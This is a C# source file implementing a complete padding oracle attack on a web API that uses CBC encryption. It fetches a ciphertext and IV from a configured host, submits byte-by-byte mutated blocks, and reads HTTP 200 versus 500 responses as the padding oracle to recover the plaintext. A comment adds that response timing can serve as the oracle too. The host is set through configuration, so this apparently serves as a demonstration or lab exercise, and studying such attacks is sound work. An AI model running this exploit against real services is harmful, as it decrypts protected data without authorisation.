using Newtonsoft.Json.Linq;
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace PadOracle
{
    class Program_Simple
    {
        static string host = $"http://{Properties.Settings.Default.hostName}/api/";
        static string path = "encrypted";
        static byte[] byCipher;
        static byte[] byIV;
        static int blocksize = Properties.Settings.Default.blockSize;
        static string reqFormat = $"{host}{path}/submit?ciphertext={{0}}&IV={{1}}";
        // Statistics
        static int totalTries = 0;
        static int mostTries = 0;
        static char worstChar = 'e';
        static readonly DateTime startTime = DateTime.Now;

        static void Moin(string[] args)
        {
            FetchCode();
            // Verify code works.
            CheckCode(byCipher, 0, byCipher.Length);

            var plainBlock = new byte[byCipher.Length]; // Building up the plaintext
            string txtPlainBlock;

            int nBlocks = byCipher.Length / blocksize;
            byte[] thisPlainBlock;

            // I used to go from last block to first, to show handling the special case of existing padding 
            // But the message reads better if we go forward.
            ParallelOptions paropts = new ParallelOptions() { MaxDegreeOfParallelism = 1 };

            for(int nBlock = 0; nBlock < nBlocks; nBlock++) {
                thisPlainBlock = MutateBlock(nBlock, nBlock == nBlocks - 1);

                // Save it for later output
                thisPlainBlock.CopyTo(plainBlock, nBlock * blocksize);

                // Output potential plaintext block.
                Console.WriteLine($"Plaintext block {nBlock}/{nBlocks}: {BitConverter.ToString(thisPlainBlock, 0, blocksize)}");
                int nTake = blocksize;
                // If last block, take only the first few characters - don't show the padding.
                if (nBlock == nBlocks - 1)
                    nTake = blocksize - thisPlainBlock[blocksize - 1];
                txtPlainBlock = UTF8Encoding.UTF8.GetString(thisPlainBlock, 0, nTake);
                Console.WriteLine($"Plain block[{nBlock}/{nBlocks}]: {txtPlainBlock}");
            }

            // Output the whole thing plus statistics
            int clearLength = byCipher.Length;
            clearLength = clearLength - plainBlock[byCipher.Length - 1];
            txtPlainBlock = UTF8Encoding.UTF8.GetString(plainBlock, 0, clearLength);
            Console.WriteLine($"Final message: {txtPlainBlock}");
            Console.WriteLine();
            Console.WriteLine("Statistics:");
            double seconds = (DateTime.Now - startTime).TotalSeconds;
            Console.WriteLine($"\tTime spent: {seconds} - {totalTries / seconds} trials per second.");
            Console.WriteLine($"\tTotal Tries: {totalTries} - Average tries per character: {(double)totalTries / byCipher.Length}");
            Console.WriteLine($"\tMost tries: {mostTries} - worst char '{worstChar}'");
       }

        static byte[] MutateBlock(int nBlock, bool isLastBlock)
        {
            byte[] testBlock = Get2CipherBlocks(nBlock); // Get blocks C[N-1] & C[N] - nBlock is N-1.
            byte[] mutatedBlock = (byte[])testBlock.Clone(); // We'll modify this one to match padding bytes.
            byte[] intermediate = new byte[blocksize];
            byte[] plainText = new byte[blocksize];
            int padCount;
            int tries = 0;

            // Working backwards through the block.
            for (int j = blocksize - 1; j >= 0; j--)
            {
                padCount = blocksize - j;

                // Set the end of the mutated block to the padding count we're currently trying.
                for (int k = blocksize - 1; k > j; k--)
                {
                    mutatedBlock[k] = (byte)(intermediate[k] ^ padCount);
                }

                tries = 0;

                byte byTarget = mutatedBlock[j];
                // Working forwards through the trial set.
                for (int i = 0; i < 256; i++)
                {
                    mutatedBlock[j] = (byte)i;

                    // Statistics
                    totalTries++;
                    tries++;

                    // Does this trial value result in a correct padding?
                    if (CheckCode(mutatedBlock, 0, 2 * blocksize))
                    {
                        intermediate[j] = (byte)(i ^ padCount);
                        plainText[j] = (byte)(intermediate[j] ^ testBlock[j]);

                        // Output
                        string ch;
                        ch = Encoding.UTF8.GetString(new byte[] { plainText[j] });
                        if (ch[0] < ' ' || ch[0] > 127)
                            ch = "?";
                        Console.WriteLine($"Plaintext[{j,2}]: {plainText[j],3} {ch} ({tries,3} tries) - C[N-1]={testBlock[j],3}, C[N]={testBlock[j + blocksize],3}, C'[N-1]={i,3}, I[N]={intermediate[j],3}");

                        // Statistics
                        if (tries > mostTries)
                        {
                            mostTries = tries;
                            worstChar = Encoding.UTF8.GetChars(new byte[] { plainText[j] })[0];
                        }

                        // Stop on success.
                        // But don't stop if we found a padding of 1 at the last byte of the last block.
                        if (isLastBlock && j == blocksize - 1 && plainText[j] == 1) continue;
                        break;
                    }
                }

            }

            return plainText;
        }

        static byte[] Get2CipherBlocks(int nBlock)
        {
            // Return a byte array containing two blocks - C[N] & C[N-1]
            if (nBlock == 0)
                return byIV.Concat(byCipher.Take(blocksize)).ToArray();
            return byCipher.Skip((nBlock - 1) * blocksize).Take(2 * blocksize).ToArray();
        }

        static void FetchCode()
        {
            HttpWebRequest wc = WebRequest.CreateHttp($"{host}{path}");
            wc.KeepAlive = true;
            string respText;
            using (var wr = wc.GetResponse())
            {
                respText = new StreamReader(wr.GetResponseStream()).ReadToEnd();
            }
            JObject job = JObject.Parse(respText);
            string b64Cipher = (string)job["ciphertext"];
            string b64Vector = (string)job["iv"];
            // Decode from base64 to bytes
            byCipher = Convert.FromBase64String(b64Cipher);
            byIV = Convert.FromBase64String(b64Vector);
        }

        static bool CheckCode(byte[] byCheck, int offset, int len)
        {
            int retryCount = 5;
            string urlCheck = WebUtility.UrlEncode(Convert.ToBase64String(byCheck, offset, len));
            string urlIV = WebUtility.UrlEncode(Convert.ToBase64String(byIV, 0, blocksize));
            if (offset >= blocksize)
                urlIV = WebUtility.UrlEncode(Convert.ToBase64String(byCheck, offset, blocksize));
            var wc = WebRequest.CreateHttp(string.Format(reqFormat, urlCheck, urlIV));
            wc.KeepAlive = true;
            WebResponse wr = null;
            // Fortunately, a 200 is "message is padded correctly", a 500 is "padding error"
            // In some environments, you have to dig deeper to distinguish the two.
            // Timing can also be used - it takes time to generate the padding exception.
            while (retryCount-- > 0)
            {
                try
                {
                    using (wr = wc.GetResponse())
                    {
                        // We don't do anything here - just knowing that we didn't hit an exception is good
                    }
                    return true; // The string is accepted.
                }
                catch (WebException x)
                {
                    if (x.Status == WebExceptionStatus.ProtocolError)
                        return false; // This is Protocol Error, which means padding error. For this site.
                    // Some other kind of error - did we get disconnected? Let's retry...
                    Console.Error.WriteLine($"Error: {x.Status} - retrying... {retryCount}");
                }
            }
            if (retryCount < 0)
            {
                throw new Exception("Bugger - errors too much for retry.");
            }
            return false;
        }
    }
}
